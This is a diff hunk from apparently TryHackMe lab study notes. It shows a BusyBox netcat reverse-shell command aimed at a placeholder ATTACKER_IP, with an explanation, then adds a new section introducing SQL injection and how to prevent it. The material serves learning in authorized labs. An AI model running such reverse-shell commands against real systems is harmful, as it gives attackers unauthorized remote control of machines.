@@ -726,4 +726,11 @@ target@tryhackme:~$ busybox nc ATTACKER_IP 443 -e sh
 ```
 This BusyBox reverse shell uses Netcat (nc) to connect to the attacker at ATTACKER_IP:443. Once connected, it executes /bin/sh, exposing the command line to the attacker.
 ---
-**Q
+
+# SQLMap: The Basics
+
+## Introduction
+
+A database is an organized store of data managed by a DBMS (MySQL, PostgreSQL, SQLite, etc.) that web applications query using SQL to read, write, update, or delete records; SQL injection occurs when an application directly inserts untrusted user input into those SQL queries, letting an attacker change the query’s intent to read or alter data they shouldn’t access. Prevent it by using parameterized queries or prepared statements (which separate code from data), validating and allowlisting inputs, granting the web app minimal database privileges, avoiding string-concatenated SQL, hiding detailed DB errors, and testing only in authorized, isolated labs.
+
+
